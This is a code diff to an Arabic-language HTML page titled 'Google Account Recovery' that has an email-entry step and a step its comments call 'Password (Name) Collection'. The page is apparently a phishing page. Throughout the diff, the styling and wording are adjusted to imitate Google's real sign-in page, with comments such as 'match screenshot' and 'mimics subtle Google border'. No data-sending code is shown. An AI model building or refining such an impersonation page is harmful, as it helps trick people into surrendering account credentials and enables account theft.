@@ -7,6 +7,7 @@
   <title>Google Account Recovery</title>
   <style>
     /* Base Reset & Typography */
+    /* Base Reset & Typography */
     body {
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
@@ -14,31 +15,36 @@
       background-color: #000;
       color: #fff;
       line-height: 1.5;
+      direction: rtl; /* RTL Support */
+      text-align: right;
+    }
+
+    :root {
+      --gm3-sys-color-primary: rgb(168 199 250 / 1);
     }
 
     /* Container */
     .container {
-      max-width: 100%;
-      margin: 0;
-      padding: 24px 16px;
-      background: #000;
-      border: none;
+      max-width: 400px;
+      margin: 80px auto 0 auto; /* top spacing to match screenshot */
+      padding: 40px 32px 32px;
+      background: #121212;
+      border-radius: 12px;
+      box-shadow: none;
+      border: 1px solid #2c2c2c; /* mimics subtle Google border */
     }
 
     /* Google Logo */
-    .logo {
+    .container svg {
       display: block;
-      margin: 24px auto 0 ;
-      width: 40px;
-      height: 40px;
+      margin: 0 0 24px auto; /* push logo to top right */
     }
 
     /* Title */
     h1 {
-      font-size: 27px;
-      font-weight: 500;
-      margin: 0 0 8px;
-      text-align: right;
+      font-size: 26px;
+      font-weight: 400;
+      margin: 0 0 12px;
       color: #fff;
     }
 
@@ -46,9 +52,8 @@
     .subtitle {
       font-size: 14px;
       color: #e8eaed;
-      text-align: right;
-      margin: 0 0 24px;
-      line-height: 1.4;
+      margin-bottom: 24px;
+      line-height: 1.6;
     }
 
     /* Input Field */
@@ -60,12 +65,16 @@
       width: 100%;
       padding: 14px 16px;
       border: 1px solid #5f6368;
-      border-radius: 8px;
-      font-size: 16px; /* Prevents iOS zoom */
+      border-radius: 6px;
+      font-size: 16px;
       background-color: #202124;
       color: #e8eaed;
       outline: none;
       box-sizing: border-box;
+    }
+
+    .input-group input::placeholder {
+      color: #9aa0a6;
     }
 
     .input-group input:focus {
@@ -73,92 +82,51 @@
       box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.3);
     }
 
-    /* Button */
-    .button {
-      background-color: #1a73e8;
-      color: #fff;
-      border: none;
-      padding: 14px 20px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      width: 100%;
-      margin: 24px 0;
-      transition: background 0.2s;
-    }
-
-    .button:hover {
-      background-color: #1967d2;
-    }
-
-    .button:active {
-      background-color: #174ea6;
-    }
-
     /* Link */
     .link {
       color: #8ab4f8;
       text-decoration: none;
       font-size: 14px;
+      display: inline-block;
+      margin-bottom: 24px;
     }
 
     .link:hover {
       text-decoration: underline;
     }
 
-    /* Email Pill */
-    .email-pill {
-      display: flex;
-      align-items: center;
-      gap: 10px;
+    /* Button */
+    .button {
+      background-color: var(--gm3-sys-color-primary);
+      color: #0b3876;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 6px;
       font-size: 15px;
-      background: #202124;
-      color: #e8eaed;
-      padding: 12px 16px;
-      border-radius: 999px;
-      border: 1px solid #5f6368;
-      margin: 16px 0 24px;
-      justify-content: space-between;
+      font-weight: 500;
+      cursor: pointer;
+      display: block;
+      margin: 24px 0 0 auto;
     }
 
-    .email-pill svg {
-      flex-shrink: 0;
+    .button:hover {
+      background-color: rgba(168, 199, 250, 0.9);
     }
 
-    /* Checkbox */
-    .checkbox-wrapper {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin: 16px 0;
-      font-size: 14px;
-      color: #e8eaed;
-    }
-
-    .checkbox-wrapper input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      accent-color: #8ab4f8;
-    }
-
-    /* Footer Links */
+    /* Footer */
     .footer {
+      margin-top: 20px;
       text-align: center;
-      margin-top: 40px;
       font-size: 13px;
       color: #9aa0a6;
       display: flex;
-      flex-wrap: wrap;
       justify-content: center;
-      gap: 16px;
-      padding: 16px 0;
+      gap: 20px;
     }
 
     .footer a {
       color: #9aa0a6;
       text-decoration: none;
-      white-space: nowrap;
     }
 
     .footer a:hover {
@@ -167,29 +135,47 @@
 
     /* Language Selector */
     .language-select {
+      text-align: center;
       font-size: 13px;
       color: #9aa0a6;
-      margin: 24px 0 16px;
-      text-align: center;
+      margin-top: 32px;
     }
 
-    /* Responsive Adjustments */
-    @media (min-width: 480px) {
+    /* Responsive */
+    @media (max-width: 480px) {
       .container {
-        max-width: 400px;
-        margin: 48px auto;
-        padding: 32px 24px;
-        border-radius: 12px;
-        background: #121212;
+        margin: 0;
+        padding: 24px 16px;
+        border-radius: 0;
+        background-color: #000;
       }
     }
+    /* Additional Styles for Step 2 */
+    .email-pill {
+      display: flex;
+      align-items: center;
+      background-color: #202124;
+      border: 1px solid #5f6368;
+      border-radius: 24px;
+      padding: 8px 12px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      color: #e8eaed;
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+    .email-pill svg {
+      margin: 0 8px;
+      flex-shrink: 0;
+    }
+
   </style>
 </head>
 <body>
 
   <!-- Step 1: Email Entry -->
   <div class="container" id="step1">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="text-align: right; margin: 16px 0;">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="logo">
       <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
       <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
       <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
@@ -198,27 +184,29 @@
 
     <h1>تسجيل دخول</h1>
     <br>
-    <p class="subtitle">إستعادة حساب google</p>
+    <p class="subtitle">باستخدام حسابك على Google</p>
 
     <div class="input-group">
-      <input type="email" id="email-input" placeholder=" الحساب أو رقم الهاتف" required autocomplete="email">
+      <input type="email" id="email-input" placeholder=" البريد الإلكتروني أو رقم الهاتف" required autocomplete="email" style="background-color: transparent;">
     </div>
-
-    <button id="next-btn" class="button">التالي</button>
-
+    
     <div style="text-align: right; margin: 16px 0;">
-      <a href="#" class="link">نسيت الحساب؟</a>
+      <a href="#" class="link">نسيت االبريد الإلكتروني؟</a>
     </div>
-
+    
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
+      <button id="next-btn" class="button" style="width: auto; min-width: 100px; margin: 0; border-radius:24px;">التالي</button>
+      <a href="#" class="link" style="margin-left: 8px;">إنشاء حساب</a>
+    </div>
     <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
-      لست انت ؟ سجل دخولك بوضع الضيف لأمان معلوماتك<br>
-      <a href="#" class="link">تعلم أكثر حول وضع الضيف</a>
+      ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.<br>
+      <a href="https://support.google.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
     </p>
   </div>
 
   <!-- Step 2: Password (Name) Collection -->
   <div class="container" id="step2" style="display: none;">
-    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 40 48" aria-hidden="true">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
       <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
       <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
       <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
@@ -246,7 +234,9 @@
       <label for="show-password">عرض كلمة المرور</label>
     </div>
 
-    <button id="submit-btn" class="button">التالي</button>
+    <div style="display: flex; justify-content: flex-end;">
+      <button id="submit-btn" class="button">التالي</button>
+    </div>
 
     <div style="text-align: center; margin: 16px 0;">
       <a href="#" class="link">جرب طريقة اخري</a>
